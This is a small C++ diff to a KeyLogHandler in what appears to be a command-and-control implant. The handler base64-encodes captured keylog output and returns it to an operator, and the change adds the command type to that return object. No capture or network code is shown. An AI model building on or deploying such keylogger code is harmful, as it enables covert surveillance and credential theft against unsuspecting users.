@@ -18,6 +18,6 @@ std::unique_ptr<IRequest> KeyLogHandler::handle(std::shared_ptr<BasicCommand>& c
 	const std::string encoded_result = base64::to_base64(result);
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
-		std::make_unique<KeyLogProduct>(command->get_command_id(), encoded_result)
+		std::make_unique<KeyLogProduct>(command->get_command_id(), command->get_command_type(), encoded_result)
 	);
 }
